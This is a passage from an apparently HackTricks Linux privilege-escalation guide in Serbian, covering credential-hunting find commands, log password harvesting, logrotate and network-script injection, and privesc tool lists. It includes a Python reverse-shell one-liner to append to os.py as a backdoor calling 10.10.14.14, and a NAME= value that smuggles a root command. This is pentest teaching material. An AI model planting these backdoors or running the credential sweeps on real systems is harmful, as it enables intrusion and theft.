find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries u PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko mogućih datoteka koje bi mogle sadržati lozinke**.\
**Još jedan interesantan alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koji je aplikacija otvorenog koda koja se koristi za izdvajanje mnogih lozinki sa lokalnog računara za Windows, Linux & Mac.

### Logovi

Ako možete da čitate logove, možda ćete moći da pronađete **interesantne/poverljive informacije u njima**. Što je log čudniji, to će verovatno biti zanimljiviji.\
Takođe, neki **loše** konfigurisani (backdoored?) **audit logs** mogu vam omogućiti da **zabeležite lozinke** unutar audit logs kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Za **čitanje logs-a, grupa** [**adm**](interesting-groups-linux-pe/index.html#adm-group) će biti od velike pomoći.

### Shell fajlovi
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generičko Creds Search/Regex

Takođe proverite fajlove koji u svom **imenu** ili unutar **sadržaja** sadrže reč "**password**", kao i IP adrese i email-ove u logovima ili hashes regexps.  
Neću ovde navoditi kako se sve ovo radi, ali ako vas zanima možete pogledati poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) izvršava.

## Datoteke kojima se može pisati

### Python library hijacking

Ako znate **odakle** će se python skripta izvršavati i **možete pisati u** taj folder ili možete **modifikovati python libraries**, možete modifikovati OS library i backdoor it (ako možete pisati tamo gde će se python skripta izvršavati, kopirajte i nalepite os.py library).

Da biste **backdoor the library**, samo dodajte na kraj os.py library sledeću liniju (promenite IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Ranljivost u `logrotate` omogućava korisnicima sa **write permissions** na log fajlu ili njegovim roditeljskim direktorijumima da potencijalno dobiju eskalirane privilegije. To je zato što se `logrotate`, koji često radi kao **root**, može manipulisati da izvrši proizvoljne fajlove, posebno u direktorijumima poput _**/etc/bash_completion.d/**_. Važno je proveriti permisije ne samo u _/var/log_ već i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost utiče na verziju `logrotate` `3.18.0` i starije

Detaljnije informacije o ranjivosti možete naći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ranjivost možete iskoristiti pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** pa kad god otkrijete da možete menjati logove, proverite ko upravlja tim logovima i proverite da li možete eskalirati privilegije zamenjujući logove symlinkovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako iz bilo kog razloga korisnik može **write** `ifcf-<whatever>` skriptu u _/etc/sysconfig/network-scripts_ **ili** može **adjust** postojeću, onda je vaš **system is pwned**.

Network skripte, na primer _ifcg-eth0_, koriste se za mrežne konekcije. Izgledaju tačno kao .INI fajlovi. Međutim, one su ~sourced~ na Linuxu od strane Network Manager-a (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim network skriptama se ne obrađuje ispravno. Ako u imenu imate **white/blank space u imenu, sistem pokušava da izvrši deo nakon belog/praznog prostora**. To znači da **sve nakon prvog praznog mesta se izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Obratite pažnju na razmak između Network i /bin/id_)

### **init, init.d, systemd i rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje servisima**. Uključuje skripte za `start`, `stop`, `restart`, i ponekad `reload` servisa. One se mogu pokretati direktno ili preko simboličkih linkova u `/etc/rc?.d/`. Alternativna putanja na Redhat sistemima je `/etc/rc.d/init.d`.

S druge strane, `/etc/init` je povezano sa **Upstart**, novijim sistemom za **upravljanje servisima** uvedenim od strane Ubuntu-a, koji koristi konfiguracione fajlove za zadatke upravljanja servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste pored Upstart konfiguracija zbog sloja kompatibilnosti u Upstartu.

**systemd** se pojavljuje kao moderan init i menadžer servisa, nudeći napredne funkcije kao što su pokretanje daemon-a na zahtev, upravljanje automount-ovima i snapshot-ovi stanja sistema. Organizuje fajlove u `/usr/lib/systemd/` za pakete distribucije i `/etc/systemd/system/` za izmene administratora, pojednostavljujući administraciju sistema.

## Ostali trikovi

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Bekstvo iz ograničenih shell-ova


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks često hook-uju syscall da bi izložili privilegovanu funkcionalnost kernela userspace manageru. Slaba autentifikacija managera (npr. provere potpisa zasnovane na FD-order ili loši šemovi lozinki) može omogućiti lokalnoj aplikaciji da se predstavlja kao manager i eskalira do root na uređajima koji su već root-ovani. Saznajte više i detalje eksploatacije ovde:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven otkrivanje servisa u VMware Tools/Aria Operations može izvući path do binarnog fajla iz command line procesa i izvršiti ga sa -v u privilegovanom kontekstu. Permisivni paterni (npr. korišćenje \S) mogu se podudariti sa attacker-staged listener-ima u zapisivim lokacijama (npr. /tmp/httpd), što vodi do izvršenja kao root (CWE-426 Untrusted Search Path).

Saznajte više i pogledajte generalizovani obrazac primenljiv na druge discovery/monitoring stack-ove ovde:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel bezbednosne zaštite

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Više pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najbolji alat za pronalaženje Linux local privilege escalation vektora:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Kolekcija više skripti**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Reference

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
